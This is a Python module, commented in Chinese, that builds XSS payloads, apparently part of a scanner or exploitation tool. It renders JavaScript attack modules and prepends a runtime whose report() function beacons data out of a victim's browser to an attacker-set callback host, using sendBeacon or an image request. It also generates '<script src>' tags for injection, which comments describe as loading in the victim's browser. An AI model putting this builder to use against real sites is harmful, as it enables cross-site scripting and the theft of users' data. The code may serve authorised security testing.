"""JS payload 构建器 — 模块 body + 参数 → 最终可执行 JS。

渲染规则:
- {{param}}           → 模块参数(html 转义,防引号破坏脚本)
- {{config.xxx}}      → 配置字段注入
- {{host}}            → 反连服务器对外地址(默认 127.0.0.1,可被参数 host 覆盖)
- 未知占位符           → 替换为空(与 flowscan config.render_template 同款正则)

每个 payload 顶部注入公共运行时:
- SERVER  反连根地址
- report(data)  Image beacon 跨域回传(无需 CORS,GET 型 kb 级以内)
- _q(name, def)    参数读取助手(URL query 覆盖模块默认值)
"""

import json
import re
from typing import Any, Dict, Optional

_HTML_ESCAPE = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
}
_ESCAPE_RE = re.compile(r"[&<>\"']")


def _html_escape(s: str) -> str:
    return _ESCAPE_RE.sub(lambda m: _HTML_ESCAPE[m.group(0)], str(s))


_PLACEHOLDER_RE = re.compile(r"\{\{\s*([^{}]+?)\s*\}\}")


def _render(template: str, context: Dict[str, Any], config: Any) -> str:
    """{{expr}} 占位符替换。expr = 参数名 | config.字段 | host。"""
    if not template:
        return ""

    def replace(match: re.Match) -> str:
        expr = match.group(1).strip()
        if expr == "host":
            return _html_escape(str(context.get("host", "127.0.0.1")))
        if expr.startswith("config."):
            key = expr[len("config."):]
            # port 允许被调用方 context 覆盖(payload 反连端口设置)
            if key == "port" and "port" in context:
                return _html_escape(str(context["port"]))
            return _html_escape(str(getattr(config, key, "")))
        return _html_escape(str(context.get(expr, "")))

    return _PLACEHOLDER_RE.sub(replace, template)


# 公共运行时前缀(注入到每个 payload 顶部;紧凑无注释)
_RUNTIME_PREFIX = r"""var SERVER = "http://{{host}}:{{config.port}}";
function _q(name, dflt) {
  try {
    var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
    return m ? decodeURIComponent(m[1].replace(/\+/g, ' ')) : (dflt == null ? '' : dflt);
  } catch (e) { return dflt == null ? '' : dflt; }
}
function report(d) {
  try {
    var payload = JSON.stringify(d);
    if (navigator.sendBeacon) {
      navigator.sendBeacon(SERVER + "{{config.route_report}}", payload);
    } else {
      var body = encodeURIComponent(payload.slice(0, 1800));
      new Image().src = SERVER + "{{config.route_report}}?d=" + body;
    }
  } catch (e) {}
}
"""


class PayloadBuilder:
    """模块 → JS payload。"""

    def __init__(self, loader, config):
        self._loader = loader
        self._config = config

    def build(self, name: str, params: Optional[Dict[str, Any]] = None,
              host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
        """构建指定模块的最终 JS 代码。

        params: 模块参数 dict(可选,缺省用模块声明参数的默认提示值)
        host:   反连地址覆盖(缺省 127.0.0.1)
        port:   反连端口覆盖(缺省 config.port;1-65535 校验,非法忽略)

        Returns: {"ok": True, "code": str} 或 {"ok": False, "error": str}
        """
        mod = self._loader.get_module(name)
        if not mod:
            return {"ok": False, "error": f"模块 {name} 不存在"}
        declared = [p[0] for p in mod.get("params", [])]
        unknown = set(params or {}) - set(declared)
        if unknown:
            return {"ok": False, "error": f"未知参数: {sorted(unknown)}"}
        context = {"host": host or "127.0.0.1"}
        if port is not None:
            try:
                p = int(port)
                if 1 <= p <= 65535:
                    context["port"] = p
            except (TypeError, ValueError):
                pass
        for pname in declared:
            if params and pname in params and params[pname] is not None:
                context[pname] = str(params[pname])
            else:
                # 缺省值取参数 hint 中 "默认 X" 的 X;无则空串
                hint = ""
                for dp in mod.get("params", []):
                    if dp[0] == pname and len(dp) > 1:
                        hint = dp[1]
                        break
                m = re.search(r"默认\s*([^\s,;]+)", str(hint))
                context[pname] = m.group(1) if m else ""
        runtime = _render(_RUNTIME_PREFIX, context, self._config)
        body = _render(mod.get("body", ""), context, self._config)
        code = runtime + "\n" + body + "\n"
        if len(code.encode("utf-8")) > self._config.max_payload_bytes:
            return {"ok": False,
                    "error": f"payload {len(code)} 字节超过上限 "
                             f"{self._config.max_payload_bytes}"}
        return {"ok": True, "code": code, "module": name}

    def build_script_tag(self, name: str, params: Optional[Dict[str, Any]] = None,
                         host: str = "", port: Optional[int] = None) -> Dict[str, Any]:
        """生成 XSS 注入用 <script src> 标签。

        host/port: 反连地址/端口覆盖(缺省 127.0.0.1 / config.port)

        Returns: {"ok": True, "tag": str, "url": str} 或 {"ok": False, ...}
        """
        mod = self._loader.get_module(name)
        if not mod:
            return {"ok": False, "error": f"模块 {name} 不存在"}
        parts = [f"m={name}"]
        # host/port 解析优先级:显式参数 → 模块参数(params,如 xss_payload 自带 host)→ 默认
        # 否则构建界面在模块参数里填了 host、单独输入框留空时,URL 会回退 127.0.0.1
        eff_host = host or (params or {}).get("host") or ""
        eff_port = port
        if eff_port is None and params and str(params.get("port") or "").strip():
            eff_port = str(params["port"]).strip()
        # host/port 作为查询参数带进 URL——受害者浏览器加载 payload.js 时,
        # _handle_payload 从 URL 读 host/port,payload 内部 SERVER 才会回连真实服务器。
        if eff_host:
            parts.append(f"host={_urlencode(eff_host)}")
        if eff_port is not None:
            parts.append(f"port={eff_port}")
        if params:
            for k, v in params.items():
                if k in ("host", "port"):
                    continue   # 已由 URL 参数承载,避免重复
                if v not in (None, ""):
                    parts.append(f"{k}={_urlencode(str(v))}")
        qs = "?" + "&".join(parts)
        p = self._config.port
        if eff_port is not None:
            try:
                pi = int(eff_port)
                if 1 <= pi <= 65535:
                    p = pi
            except (TypeError, ValueError):
                pass
        url = (f"http://{eff_host or '127.0.0.1'}:{p}"
               f"{self._config.route_payload}{qs}")
        tag = f'<script src="{url}"></script>'
        return {"ok": True, "tag": tag, "url": url}


def _urlencode(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s, safe="")
